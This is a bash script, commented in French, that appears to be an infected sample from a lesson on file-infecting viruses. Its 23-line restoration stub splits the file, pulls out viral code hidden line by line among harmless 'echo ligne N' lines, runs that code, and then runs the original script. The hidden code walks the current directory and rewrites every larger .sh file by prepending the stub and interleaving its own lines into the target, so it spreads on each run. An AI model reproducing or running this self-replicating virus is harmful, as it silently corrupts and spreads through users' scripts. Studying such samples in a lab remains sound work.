#!/bin/bash
R=23  # nombre de lignes du code de restauration
LV=38  # nombre de lignes du code viral 
L=$(wc -l $0 | cut -d " " -f1)
tail -n $(($L-$R)) $0 > temp
L=$(wc -l temp | cut -d " " -f1)
s=$(( ($L-$LV) / $LV ))
cp /dev/null restauration-cible.sh
cp /dev/null restauration-codeviral.sh
i=0
while [ $i -lt $(($LV)) ]
do
    echo "i=$i"
    head -n $(($i*($s+1)+$s))  temp | tail -n $s >> restauration-cible.sh  
    head -n $((($i+1)*($s+1)))  temp | tail -n 1 >> restauration-codeviral.sh
    i=$(($i+1))
done
tail -n $(($L-$LV*($s+1))) temp >> restauration-cible.sh
chmod u+x restauration-cible.sh restauration-codeviral.sh
./restauration-codeviral.sh $0 
./restauration-cible.sh
rm restauration-cible.sh restauration-codeviral.sh
exit ################################################ fin restauration   
#!/bin/bash
echo "ligne 1"
#!/bin/bash
echo "ligne 2"
echo "ligne 3"
## R =  nombre de lignes du code de restauration  et code viral
echo "ligne 4"
echo "ligne 5"
R=23
echo "ligne 6"
echo "ligne 7"
LV=$(wc -l $0 | cut -d " " -f1)
echo "ligne 8"
echo "ligne 9"
for file in *.sh
echo "ligne 10"
echo "ligne 11"
do
echo "ligne 12"
echo "ligne 13"
    L=$(wc -l $file | cut -d " " -f1)
echo "ligne 14"
echo "ligne 15"
    if [ $file != $(basename $0)   -a  $(($LV)) -lt $(($L))  -a  $file != $(basename $1)  -a  $file != $(basename "restauration-cible.sh") ]
echo "ligne 16"
echo "ligne 17"
    then	
echo "ligne 18"
echo "ligne 19"
	# les fichiers d'entree et de sortie
echo "ligne 20"
echo "ligne 21"
	cible=$file
echo "ligne 22"
echo "ligne 23"
	codeviral=$0
echo "ligne 24"
echo "ligne 25"
	resultat="temp"
echo "ligne 26"
echo "ligne 27"
	cp /dev/null $resultat	
echo "ligne 28"
echo "ligne 29"
	echo "$cible, $codeviral, $resultat"
echo "ligne 30"
echo "ligne 31"
	# ajout du code de restauration
echo "ligne 32"
echo "ligne 33"
	head -n $R $1 >> $resultat
echo "ligne 34"
echo "ligne 35"
	# calcul de s
echo "ligne 36"
echo "ligne 37"
	L=$(wc -l $cible | cut -d " " -f1)
echo "ligne 38"
echo "ligne 39"
	LV=$(wc -l $codeviral | cut -d " " -f1)
echo "ligne 40"
echo "ligne 41"
	s=$((L / LV ))
echo "ligne 42"
echo "ligne 43"
	echo "ligne cible=$L, ligne virale=$LV, s=$s"
echo "ligne 44"
echo "ligne 45"
	# boucle ou on entrelace cible et code viral
echo "ligne 46"
echo "ligne 47"
	j=1
echo "ligne 48"
echo "ligne 49"
	while [ $j -le $LV ]
echo "ligne 50"
echo "ligne 51"
	do
echo "ligne 52"
echo "ligne 53"
	    head -n $(($j*$s))  $cible | tail -n $s >> $resultat
echo "ligne 54"
echo "ligne 55"
	    head -n $j  $codeviral | tail -n 1 >> $resultat    
echo "ligne 56"
echo "ligne 57"
	    j=$(($j+1))
echo "ligne 58"
echo "ligne 59"
	done
echo "ligne 60"
echo "ligne 61"
	tail -n $(($L-$LV*$s)) $cible >> $resultat
echo "ligne 62"
echo "ligne 63"
	mv $resultat "$file"
echo "ligne 64"
echo "ligne 65"
	#
echo "ligne 66"
echo "ligne 67"
	#
echo "ligne 68"
echo "ligne 69"
    fi
echo "ligne 70"
echo "ligne 71"
    #
echo "ligne 72"
echo "ligne 73"
done
echo "ligne 74"
echo "ligne 75"
#
echo "ligne 76"
echo "ligne 77"
echo "ligne 78"
echo "ligne 79"
echo "ligne 80"
echo "ligne 81"
echo "ligne 82"
echo "ligne 83"
echo "ligne 84"
echo "ligne 85"
echo "ligne 86"
echo "ligne 87"
echo "ligne 88"
echo "ligne 89"
echo "ligne 90"
echo "ligne 91"
echo "ligne 92"
echo "ligne 93"
echo "ligne 94"
echo "ligne 95"
echo "ligne 96"
echo "ligne 97"
echo "ligne 98"
echo "ligne 99"
echo "ligne 100"
